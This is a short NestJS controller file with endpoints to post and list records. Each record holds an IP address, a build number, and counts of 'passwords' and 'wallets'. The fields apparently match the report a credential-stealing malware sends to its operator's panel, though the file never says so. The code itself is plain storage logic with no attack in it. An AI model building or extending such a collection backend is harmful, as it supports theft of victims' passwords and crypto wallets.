import { Body, Controller, Get, Post } from '@nestjs/common';
import { AppService } from './app.service';

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}

  @Post()
  create(@Body() dto: {
    id: number, 
    num: string,
    ip: string, 
    browse: string, 
    passwords: number, 
    wallets: number,  
    build: number,
    date: Date
  }) {
      return this.appService.create(dto)
  }

  @Get()
    findMany() {
        return this.appService.findMany();
    }
}
